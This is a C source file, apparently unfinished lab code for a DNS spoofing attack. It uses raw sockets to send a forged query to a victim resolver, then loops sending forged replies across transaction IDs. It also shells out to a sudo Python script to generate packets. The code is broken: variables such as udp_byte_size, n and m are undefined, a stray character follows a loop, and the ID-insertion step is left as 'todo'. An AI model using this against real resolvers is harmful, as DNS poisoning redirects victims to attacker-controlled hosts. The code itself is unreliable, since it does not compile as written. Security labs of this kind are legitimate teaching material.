// ----udp.c------
// This sample program must be run by root lol!
//
// The program is to spoofing tons of different queries to the victim.
// Use wireshark to study the packets. However, it is not enough for
// the lab, please finish the response packet and complete the task.
//
// Compile command:
// gcc -lpcap dns_attack.c -o dns_attack
//
//

#include <unistd.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <libnet.h>
// The packet length
#define PCKT_LEN 8192
#define FLAG_R 0x8400
#define FLAG_Q 0x0100

// Can create separate header file (.h) for all headers' structure
// The IP header's structure
struct ipheader
{
    unsigned char iph_ihl : 4, iph_ver : 4;
    unsigned char iph_tos;
    unsigned short int iph_len;
    unsigned short int iph_ident;
    //    unsigned char      iph_flag;
    unsigned short int iph_offset;
    unsigned char iph_ttl;
    unsigned char iph_protocol;
    unsigned short int iph_chksum;
    unsigned int iph_sourceip;
    unsigned int iph_destip;
};

// UDP header's structure
struct udpheader
{
    unsigned short int udph_srcport;
    unsigned short int udph_destport;
    unsigned short int udph_len;
    unsigned short int udph_chksum;
};
struct dnsheader
{
    unsigned short int query_id;
    unsigned short int flags;
    unsigned short int QDCOUNT;
    unsigned short int ANCOUNT;
    unsigned short int NSCOUNT;
    unsigned short int ARCOUNT;
};
// This structure just for convinience in the DNS packet, because such 4 byte data often appears.
struct dataEnd
{
    unsigned short int type;
    unsigned short int class;
};
// total udp header length: 8 bytes (=64 bits)

unsigned int checksum(uint16_t *usBuff, int isize)
{
    unsigned int cksum = 0;
    for (; isize > 1; isize -= 2)
    {
        cksum += *usBuff++;
    }
    if (isize == 1)
    {
        cksum += *(uint16_t *)usBuff;
    }
    return (cksum);
}

// calculate udp checksum
uint16_t check_udp_sum(uint8_t *buffer, int len)
{
    // todo
    uint32_t sum = 0;
    struct ipheader* ipHeader = (struct ipheader*)(buffer);
    struct udpheader* udpHeader = (struct udpheader*)(buffer + sizeof(struct ipheader));

    /* Set checknum to 0. */
    udpHeader->udph_chksum = 0;

    /* Add sequential 16 bit words to sum. */
    sum = checksum((uint16_t*)&(ipHeader->iph_sourceip), 4);    // SrcIP
    sum += checksum((uint16_t*)&(ipHeader->iph_destip), 4);     // DestIP
    sum += htons(IPPROTO_UDP);                                  // Protocol
    sum += htons(udp_byte_size);                                // Udp_len
    sum += checksum((uint16_t*)udpHeader, udp_byte_size);       // Udp

    /* Add back carry outs from top 16 bits to low 16 bits. */
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (uint16_t)(~sum);
}


void send_pkt(char* buffer, int pkt_size)
{
  struct sockaddr_in dest_info;
  int enable=1;
  
  int sock=socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
  
  setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));
  
  struct ipheader *ip = (struct ipheader *)buffer;
  struct udpheader *udp = (struct udpheader *) (buffer + sizeof(struct ipheader));

  dest_info.sin_family = AF_INET;
  dest_info.sin_addr.s_addr = ip->iph_destip;
  
  udp->udph_chksum=check_udp_sum(buffer, pkt_size-sizeof(struct ipheader));
  if(sendto(sock, buffer, pkt_size, 0, (struct sockaddr *)&dest_info, sizeof(dest_info)) < 0){
		printf("packet send error %d which means %s\n",errno,strerror(errno));
	}
  close(sock);
}

int main(int argc, char *argv[])
{
    

    
    while(1)
    {
      system("sudo python general_dns.py"); // random pkt
      
      // read pkt
      FILE * f_q = fopen("query.bin","rb");
      char q_buffer[PCKT_LEN];
      int q_n = fread(q_buffer, 1, PCKT_LEN, f_q);
      send_pkt(q_buffer, q_n);
      
      FILE * f_r = fopen("reply.bin","rb");
      char r_buffer[PCKT_LEN];
      int r_n = fread(r_buffer, 1, PCKT_LEN, f_r);
      
      usleep(2);
      
      for(unsigned short i=n;i<m;i++){ //random id:todo
        unsigned short order=htons(i); //little->big
        // todo put id into the pkt
        send_pkt(r_buffer, r_n);
      }s
    }

    return 0;
}
